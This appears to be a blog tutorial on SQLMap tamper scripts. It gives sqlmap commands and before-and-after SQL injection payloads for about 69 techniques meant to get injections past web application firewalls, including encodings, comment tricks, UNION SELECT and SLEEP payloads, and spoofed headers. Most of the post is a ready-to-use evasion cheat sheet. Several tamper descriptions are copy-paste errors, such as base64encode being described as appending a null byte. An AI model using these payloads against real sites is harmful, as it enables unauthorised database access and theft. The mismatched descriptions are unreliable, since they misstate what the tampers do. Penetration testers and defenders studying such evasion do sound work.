Hello, in this post, I will be sharing information about SQLMap tamper scripts. So, what is SQLMap? What are tamper scripts in SQLMap? And how can they be used to bypass a WAF? Etc.

# **Introduction**

SQLMap is a tool for finding and exploiting security weaknesses in websites and web applications related to database interactions, particularly SQL injection vulnerabilities. The SQLMap display can be seen in Figure 1.

![](https://miro.medium.com/v2/resize:fit:700/0*gj5U3OGoTaDWWYB_.png)

Figure 1: SQLMap Display

When trying to perform SQL Injection on a website, some websites have strong security in place, including thorough parameter and form sanitation. Additionally, some sites employ a Web Application Firewall (WAF), which can make it difficult for penetration testers to exploit the website using SQL Injection attacks.

![](https://miro.medium.com/v2/resize:fit:700/1*R5QpV4L6JIkbn1zsyDEp2w.png)

Figure 2: Cloudflare WAF

So, how can penetration testers bypass these security measures using SQLMap? SQLMap offers a feature called a tamper script, which allows you to modify the SQL query sent to the website in a way that can bypass the sanitation or even the WAF on the website.

# **Example**

The following is a simple command where I will try to use a tamper script called `space2comment` which is to remove space in the payload

sqlmap -u "https://example.com/delete.php?id=1" --level=1 --risk=1 --tamper space2comment

And this is an example of a HTTP request when I don’t use the `space2comment` tamper script

GET /delete.php?id=1%20AND%209134=5770 HTTP/1.1  
Cache-control: no-cache  
User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)  
Host: example.com  
Accept: */*  
Accept-encoding: gzip,deflate  
Connection: close

`%20` is equivalent to space (You need to decode it using [URLDecoder](https://www.urldecoder.org/). And this is an example of a HTTP request when i use `space2comment` tamper script

GET /delete.php?id=1/**/AND/**/9134=5770 HTTP/1.1  
Cache-control: no-cache  
User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)  
Host: example.com  
Accept: */*  
Accept-encoding: gzip,deflate  
Connection: close

See the difference? `%20` in the previous HTTP request is changed to `/**/` which will bypass filters on the website if the user input does not allow any spaces. And that is a small example of using tamper scripts in SQLMap. The next section is a list of tamper scripts that we can use to do SQL Injection using SQLMap.

# **List Tamper Scripts**

There are 69 tamper scripts that we can use and here is the list:

- 0eunion

Replaces instances of `<int> UNION` with `<int>e0UNION`. For example:

-- First payload  
1 UNION ALL SELECT  
  
-- After using the tamper  
1e0UNION ALL SELECT

- apostrophemask

Replaces apostrophe character (‘) with its UTF-8 full width counterpart. For example:

-- First payload  
1 AND '1'='1  
  
-- After using the tamper  
1 AND %EF%BC%871%EF%BC%87=%EF%BC%871

- apostrophenullencode

Replaces apostrophe character (‘) with its UTF-8 full width counterpart. For example:

-- First payload  
1 AND '1'='1  
  
-- After using the tamper  
1 AND %00%271%00%27=%00%271

- appendnullbyte

Appends (Access) NULL byte character (%00) at the end of payload. For example:

-- First payload  
1 AND 1=1  
  
-- After using the tamper  
1 AND 1=1%00

- base64encode

Appends (Access) NULL byte character (%00) at the end of payload. For example:

-- First payload  
1' AND SLEEP(5)#  
  
-- After using the tamper  
MScgQU5EIFNMRUVQKDUpIw==

- between

Replaces greater than operator (‘>’) with `NOT BETWEEN 0 AND #`and equals operator (‘=’) with `BETWEEN # AND #`. For example:

-- First payload  
1 AND A = B--  
  
-- After using the tamper  
1 AND A BETWEEN B AND B--

- binary

Injects keyword binary where possible. For example:

-- First payload  
1 UNION ALL SELECT NULL, NULL, NULL  
  
-- After using the tamper  
1 UNION ALL SELECT binary NULL, binary NULL, binary NULL

- bluecoat

Replaces space character after SQL statement with a valid random blank character. Afterwards replace character equal sign (‘=’) with operator `LIKE`. For example:

-- First payload  
SELECT id FROM users WHERE id = 1  
  
-- After using the tamper  
SELECT%09id FROM%09users WHERE%09id LIKE 1

- chardoubleencode

Double URL-encodes all characters in a given payload (not processing already encoded). For example:

-- First payload  
SELECT FIELD FROM TABLE  
  
-- After using the tamper  
%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545

- charencode

URL-encodes all characters in a given payload (not processing already encoded). For example:

-- First payload  
SELECT FIELD FROM TABLE  
  
-- After using the tamper  
%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45

- charunicodeencode

Unicode-URL-encodes all characters in a given payload (not processing already encoded). For example:

-- First payload  
SELECT FIELD FROM TABLE  
  
-- After using the tamper  
%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045

- charunicodeescape

Unicode-escapes non-encoded characters in a given payload (not processing already encoded). For example:

-- First payload  
SELECT FIELD FROM TABLE  
  
-- After using the tamper  
\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045

- commalesslimit

Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart. For example:

-- First payload  
LIMIT 2, 3  
  
-- After using the tamper  
LIMIT 3 OFFSET 2

- commalessmid

Replaces (MySQL) instances like `MID(A, B, C)` with `MID(A FROM B FOR C)` counterpart. For example:

-- First payload  
MID(VERSION(), 1, 1)  
  
-- After using the tamper  
MID(VERSION() FROM 1 FOR 1)

- commentbeforeparentheses

Prepends (inline) comment before parentheses. For example:

-- First payload  
SELECT ABS(1)  
  
-- After using the tamper  
SELECT ABS/**/(1)

- concat2concatws

Replaces (MySQL) instances like `CONCAT(A, B)` with `CONCAT_WS(MID(CHAR(0), 0, 0), A, B)` counterpart. For example:

-- First payload  
CONCAT(1,2)  
  
-- After using the tamper  
CONCAT_WS(MID(CHAR(0),0,0),1,2)

- decentities

HTML encode in decimal (using code points) all characters. For example:

-- First payload  
1' AND SLEEP(5)#  
  
-- After using the tamper  
&#49;&#39;&#32;&#65;&#78;&#68;&#32;&#83;&#76;&#69;&#69;&#80;&#40;&#53;&#41;&#35;

- dunion

`Replaces instances of <int> UNION with <int>DUNION. For example:

-- First payload  
1 UNION ALL SELECT  
  
-- After using the tamper  
1DUNION ALL SELECT

- equaltolike

Replaces all occurrences of operator equal (‘=’) with `LIKE` counterpart. For example:

-- First payload  
SELECT * FROM users WHERE id=1  
  
-- After using the tamper  
SELECT * FROM users WHERE id LIKE 1

- equaltorlike

Replaces all occurrences of operator equal (‘=’) with `RLIKE` counterpart. For example:

-- First payload  
SELECT * FROM users WHERE id=1  
  
-- After using the tamper  
SELECT * FROM users WHERE id RLIKE 1

- escapequotes

Slash escape single and double quotes. For example:

-- First payload  
1" AND SLEEP(5)#  
1' AND SLEEP(5)#  
  
-- After using the tamper  
1\\" AND SLEEP(5)#  
1\\' AND SLEEP(5)#

- greatest

Replaces greater than operator (‘>’) with `GREATEST` counterpart. For example:

-- First payload  
1 AND A > B  
  
-- After using the tamper  
1 AND GREATEST(A,B+1)=A

- halfversionedmorekeywords

Adds (MySQL) versioned comment before each keyword. For example:

-- First payload  
' UNION ALL SELECT  
  
-- After using the tamper  
'/*!0UNION/*!0ALL/*!0SELECT

- hex2char

Replaces each (MySQL) `0x<hex>` encoded string with equivalent `CONCAT(CHAR(),…)` counterpart. For example:

-- First payload  
SELECT 0xdeadbeef  
  
-- After using the tamper  
SELECT CONCAT(CHAR(222),CHAR(173),CHAR(190),CHAR(239))

- hexentities

HTML encode in hexadecimal (using code points) all characters. For example:

-- First payload  
1' AND SLEEP(5)#  
  
-- After using the tamper  
&#x31;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x53;&#x4c;&#x45;&#x45;&#x50;&#x28;&#x35;&#x29;&#x23;

- htmlencode

HTML encode (using code points) all non-alphanumeric characters. For example:

-- First payload  
1' AND SLEEP(5)#  
  
-- After using the tamper  
1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;

- if2case

Replaces instances like `IF(A, B, C)` with `CASE WHEN (A) THEN (B) ELSE (c) END` counterpart. For example:

-- First payload  
IF(1, 2, 3)  
  
-- After using the tamper  
CASE WHEN (1) THEN (2) ELSE (3) END

- ifnull2casewhenisnull

Replaces instances like `IFNULL(A, B)` with `CASE WHEN ISNULL(A) THEN (B) ELSE (A) END` counterpart. For example:

-- First payload  
IFNULL(1, 2)  
  
-- After using the tamper  
CASE WHEN ISNULL(1) THEN (2) ELSE (1) END

- ifnull2ifisnull

Replaces instances like `IFNULL(A, B)` with `IF(ISNULL(A), B, A)` counterpart. For example:

-- First payload  
IFNULL(1, 2)  
  
-- After using the tamper  
IF(ISNULL(1),2,1)

- informationschemacomment

Add an inline comment (/**/) to the end of all occurrences of (MySQL) `information_schema` identifier. For example:

-- First payload  
SELECT table_name FROM INFORMATION_SCHEMA.TABLES  
  
-- After using the tamper  
SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES

- least

Replaces greater than operator (‘>’) with `LEAST` counterpart. For example:

-- First payload  
1 AND A > B  
  
-- After using the tamper  
1 AND LEAST(A,B+1)=B+1

- lowercase

Replaces each keyword character with lower case value. For example:

-- First payload  
INSERT INTO  
  
-- After using the tamper  
insert into

- luanginx

LUA-Nginx WAFs Bypass. For example:

-- First payload  
1 AND 2>1  
  
-- After using the tamper  
34=&Xe=&90=&Ni=&rW=&lc=&te=&T4=&zO=&NY=&B4=&hM=&X2=&pU=&D8=&hm=&p0=&7y=&18=&RK=&Xi=&5M=&vM=&hO=&bg=&5c=&b8=&dE=&7I=&5I=&90=&R2=&BK=&bY=&p4=&lu=&po=&Vq=&bY=&3c=&ps=&Xu=&lK=&3Q=&7s=&pq=&1E=&rM=&FG=&vG=&Xy=&tQ=&lm=&rO=&pO=&rO=&1M=&vy=&La=&xW=&f8=&du=&94=&vE=&9q=&bE=&lQ=&JS=&NQ=&fE=&RO=&FI=&zm=&5A=&lE=&DK=&x8=&RQ=&Xw=&LY=&5S=&zi=&Js=&la=&3I=&r8=&re=&Xe=&5A=&3w=&vs=&zQ=&1Q=&HW=&Bw=&Xk=&LU=&Lk=&1E=&Nw=&pm=&ns=&zO=&xq=&7k=&v4=&F6=&Pi=&vo=&zY=&vk=&3w=&tU=&nW=&TG=&NM=&9U=&p4=&9A=&T8=&Xu=&xa=&Jk=&nq=&La=&lo=&zW=&xS=&v0=&Z4=&vi=&Pu=&jK=&DE=&72=&fU=&DW=&1g=&RU=&Hi=&li=&R8=&dC=&nI=&9A=&tq=&1w=&7u=&rg=&pa=&7c=&zk=&rO=&xy=&ZA=&1K=&ha=&tE=&RC=&3m=&r2=&Vc=&B6=&9A=&Pk=&Pi=&zy=&lI=&pu=&re=&vS=&zk=&RE=&xS=&Fs=&x8=&Fe=&rk=&Fi=&Tm=&fA=&Zu=&DS=&No=&lm=&lu=&li=&jC=&Do=&Tw=&xo=&zQ=&nO=&ng=&nC=&PS=&fU=&Lc=&Za=&Ta=&1y=&lw=&pA=&ZW=&nw=&pM=&pa=&Rk=&lE=&5c=&T4=&Vs=&7W=&Jm=&xG=&nC=&Js=&xM=&Rg=&zC=&Dq=&VA=&Vy=&9o=&7o=&Fk=&Ta=&Fq=&9y=&vq=&rW=&X4=&1W=&hI=&nA=&hs=&He=&No=&vy=&9C=&ZU=&t6=&1U=&1Q=&Do=&bk=&7G=&nA=&VE=&F0=&BO=&l2=&BO=&7o=&zq=&B4=&fA=&lI=&Xy=&Ji=&lk=&7M=&JG=&Be=&ts=&36=&tW=&fG=&T4=&vM=&hG=&tO=&VO=&9m=&Rm=&LA=&5K=&FY=&HW=&7Q=&t0=&3I=&Du=&Xc=&BS=&N0=&x4=&fq=&jI=&Ze=&TQ=&5i=&T2=&FQ=&VI=&Te=&Hq=&fw=&LI=&Xq=&LC=&B0=&h6=&TY=&HG=&Hw=&dK=&ru=&3k=&JQ=&5g=&9s=&HQ=&vY=&1S=&ta=&bq=&1u=&9i=&DM=&DA=&TG=&vQ=&Nu=&RK=&da=&56=&nm=&vE=&Fg=&jY=&t0=&DG=&9o=&PE=&da=&D4=&VE=&po=&nm=&lW=&X0=&BY=&NK=&pY=&5Q=&jw=&r0=&FM=&lU=&da=&ls=&Lg=&D8=&B8=&FW=&3M=&zy=&ho=&Dc=&HW=&7E=&bM=&Re=&jk=&Xe=&JC=&vs=&Ny=&D4=&fA=&DM=&1o=&9w=&3C=&Rw=&Vc=&Ro=&PK=&rw=&Re=&54=&xK=&VK=&1O=&1U=&vg=&Ls=&xq=&NA=&zU=&di=&BS=&pK=&bW=&Vq=&BC=&l6=&34=&PE=&JG=&TA=&NU=&hi=&T0=&Rs=&fw=&FQ=&NQ=&Dq=&Dm=&1w=&PC=&j2=&r6=&re=&t2=&Ry=&h2=&9m=&nw=&X4=&vI=&rY=&1K=&7m=&7g=&J8=&Pm=&RO=&7A=&fO=&1w=&1g=&7U=&7Y=&hQ=&FC=&vu=&Lw=&5I=&t0=&Na=&vk=&Te=&5S=&ZM=&Xs=&Vg=&tE=&J2=&Ts=&Dm=&Ry=&FC=&7i=&h8=&3y=&zk=&5G=&NC=&Pq=&ds=&zK=&d8=&zU=&1a=&d8=&Js=&nk=&TQ=&tC=&n8=&Hc=&Ru=&H0=&Bo=&XE=&Jm=&xK=&r2=&Fu=&FO=&NO=&7g=&PC=&Bq=&3O=&FQ=&1o=&5G=&zS=&Ps=&j0=&b0=&RM=&DQ=&RQ=&zY=&nk=&1 AND 2>1

- misunion

Replaces instances of `UNION` with `-.1UNION` . For example:

-- First payload  
1 UNION ALL SELECT  
  
-- After using the tamper  
1-.1UNION ALL SELECT

- modsecurityversioned

Embraces complete query with (MySQL) versioned comment. For example:

-- First payload  
1 AND 2>1--  
  
-- After using the tamper  
1 /*!30963AND 2>1*/--

- modsecurityzeroversioned

Embraces complete query with (MySQL) zero-versioned comment. For example:

-- First payload  
1 AND 2>1--  
  
-- After using the tamper  
1 /*!00000AND 2>1*/--

- multiplespaces

Adds multiple spaces (‘ ‘) around SQL keywords. For example:

-- First payload  
'1 UNION SELECT foobar  
  
-- After using the tamper  
'1     UNION     SELECT      foobar

- ord2ascii

Replaces `ORD()` occurences with equivalent `ASCII()` calls. For example:

-- First payload  
ORD('97')  
  
-- After using the tamper  
ASCII('97')

- overlongutf8

Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded). For example:

-- First payload  
SELECT FIELD FROM TABLE WHERE 2>1  
  
-- After using the tamper  
SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1

- overlongutf8more

Converts all characters in a given payload to overlong UTF8 (not processing already encoded). For example:

-- First payload  
SELECT FIELD FROM TABLE WHERE 2>1  
  
-- After using the tamper  
%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94%C0%A0%C1%86%C1%89%C1%85%C1%8C%C1%84%C0%A0%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%94%C1%81%C1%82%C1%8C%C1%85%C0%A0%C1%97%C1%88%C1%85%C1%92%C1%85%C0%A0%C0%B2%C0%BE%C0%B1

- percentage

Adds a percentage sign (‘%’) infront of each character. For example:

-- First payload  
SELECT FIELD FROM TABLE  
  
-- After using the tamper  
%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E

- plus2concat

Replaces plus operator (‘+’) with (MsSQL) function `CONCAT()` counterpart. For example:

-- First payload  
SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL  
  
-- After using the tamper  
SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL

- plus2fnconcat

Replaces plus operator (‘+’) with (MsSQL) ODBC function `{fn CONCAT()}` counterpart. For example:

-- First payload  
SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL  
  
-- After using the tamper  
SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL

- randomcase

Replaces each keyword character with random case value. For example:

-- First payload  
INSERT INTO  
  
-- After using the tamper  
iNSeRt IntO

- randomcomments

Add random inline comments inside SQL keywords. For example:

-- First payload  
INSERT INTO  
  
-- After using the tamper  
I/**/NSE/**/RT INT/**/O

- schemasplit

Splits FROM schema identifiers (e.g. `testdb.users`) with whitespace. For example:

-- First payload  
SELECT id FROM testdb.users  
  
-- After using the tamper  
SELECT id FROM testdb 9.e.users

- scientific

Abuses MySQL scientific notation. For example:

-- First payload  
1 AND ORD(MID((CURRENT_USER()),7,1))>1  
  
-- After using the tamper  
1 AND ORD 1.e(MID((CURRENT_USER 1.e( 1.e) 1.e) 1.e,7 1.e,1 1.e) 1.e)>1

- sleep2getlock

Replaces instances like `SLEEP(5)` with (e.g.) `GET_LOCK('ETgP',5)`. For example:

-- First payload  
SLEEP(5)  
  
-- After using the tamper  
GET_LOCK('xxxx',5)

- sp_password

Appends (MsSQL) function `sp_password` to the end of the payload for automatic obfuscation from DBMS logs. For example:

-- First payload  
1 AND 9227=9227--  
  
-- After using the tamper  
1 AND 9227=9227-- sp_password

- space2comment

Replaces space character (‘ ‘) with comments `/**/`

-- First payload  
SELECT passwords FROM users  
  
-- After using the tamper  
SELECT/**/passwords/**/FROM/**/users

- space2dash

Replaces space character (‘ ‘) with a dash comment (‘ — ‘) followed by a random string and a new line (‘\n’). For example:

-- First payload  
1 AND 9227=9227  
  
-- After using the tamper  
1--upgPydUzKpMX%0AAND--RcDKhIr%0A9227=9227

- space2hash

Replaces (MySQL) instances of space character (‘ ‘) with a pound character (‘#’) followed by a random string and a new line (‘\n’). For example:

-- First payload  
1 AND 9227=9227  
  
-- After using the tamper  
1%23upgPydUzKpMX%0AAND%23RcDKhIr%0A9227=9227

- space2morecomment

Replaces (MySQL) instances of space character (‘ ‘) with comments `/**_**/`

-- First payload  
SELECT passwords FROM users  
  
-- After using the tamper  
SELECT/**_**/passwords/**_**/FROM/**_**/users

- space2morehash

Replaces (MySQL) instances of space character (‘ ‘) with a pound character (‘#’) followed by a random string and a new line (‘\n’). For example:

-- First payload  
1 AND 9227=9227  
  
-- After using the tamper  
1%23RcDKhIr%0AAND%23upgPydUzKpMX%0A%23lgbaxYjWJ%0A9227=9227

- space2mssqlblank

Replaces (MsSQL) instances of space character (‘ ‘) with a random blank character from a valid set of alternate characters. For example:

-- First payload  
SELECT id FROM users  
  
-- After using the tamper  
SELECT%0Did%0DFROM%04users

- space2mssqlhash

Replaces space character (‘ ‘) with a pound character (‘#’) followed by a new line (‘\n’). For example:

-- First payload  
1 AND 9227=9227  
  
-- After using the tamper  
1%23%0AAND%23%0A9227=9227

- space2mysqlblank

Replaces (MySQL) instances of space character (‘ ‘) with a random blank character from a valid set of alternate characters. For example:

-- First payload  
SELECT id FROM users  
  
-- After using the tamper  
SELECT%A0id%0CFROM%0Dusers

- space2mysqldash

Replaces space character (‘ ‘) with a dash comment (‘ — ‘) followed by a new line (‘\n’). For example:

-- First payload  
1 AND 9227=9227  
  
-- After using the tamper  
1--%0AAND--%0A9227=9227

- space2plus

Replaces space character (‘ ‘) with plus (‘+’). For example:

-- First payload  
SELECT id FROM users  
  
-- After using the tamper  
SELECT+id+FROM+users

- space2randomblank

Replaces space character (‘ ‘) with a random blank character from a valid set of alternate characters. For example:

-- First payload  
SELECT id FROM users  
  
-- After using the tamper  
SELECT%0Did%0CFROM%0Ausers

- substring2leftright

Replaces PostgreSQL SUBSTRING with LEFT and RIGHT. For example:

-- First payload  
SUBSTRING((SELECT usename FROM pg_user)::text FROM 1 FOR 1)  
  
-- After using the tamper  
LEFT((SELECT usename FROM pg_user)::text,1)

- symboliclogical

Replaces `AND` and `OR` logical operators with their symbolic counterparts (&& and ||). For example:

-- First payload  
1 AND '1'='1  
  
-- After using the tamper  
1 && '1'='1

- unionalltounion

Replaces instances of `UNION ALL SELECT` with `UNION SELECT` counterpart. For example:

-- First payload  
1' UNION ALL SELECT  
  
-- After using the tamper  
1' UNION SELECT

- unmagicquotes

Replaces quote character (‘) with a multi-byte combo `%BF%27` together with generic comment at the end. For example:

-- First payload  
1' AND 1=1  
  
-- After using the tamper  
1%bf%27-- -

- uppercase

Replaces each keyword character with upper case value. For example:

-- First payload  
insert into  
  
-- After using the tamper  
INSERT INTO

- varnish

Appends a HTTP header (eg. `X-originating-IP` ) to bypass Varnish Firewall. For example:

X-Forwarded-For: 184.189.250.0  
X-Originating-IP: 127.0.0.1

- versionedkeywords

Encloses each non-function keyword with (MySQL) versioned comment. For example:

-- First payload  
1 UNION ALL SELECT  
  
-- After using the tamper  
1/*!UNION*//*!ALL*//*!SELECT

- versionedmorekeywords

Encloses each keyword with (MySQL) versioned comment. For example:

-- First payload  
1 UNION ALL SELECT  
  
-- After using the tamper  
1/*!UNION*//*!ALL*//*!SELECT

- xforwardedfor

Append a fake HTTP header (eg `X-Forwarded-For` ). For example:

X-Forwarded-For: 32.12.225.32

> This list will be updated if tamper scripts are removed or added to the SQLmap repo

# **Pro Tips**

- Before you will use the SQLMap tamper script. It’s best to find out first what characters are filtered by the website you are trying to pentest. For example if the website filter whitespace character, you can use `space2comment` or `space2plus` tamper. Or if your website only accept `base64` you can use `base64encoding`
- You can use 2 or more tamper scripts in 1 command, for example i want to use `space2comment` and `randomcomments` :

sqlmap -u "https://example.com/delete.php?id=1" --level=1 --risk=1 --tamper space2comment,randomcomments

# **References**

- [https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3](https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3)
- [https://github.com/sqlmapproject/sqlmap/blob/master/tamper/](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/)

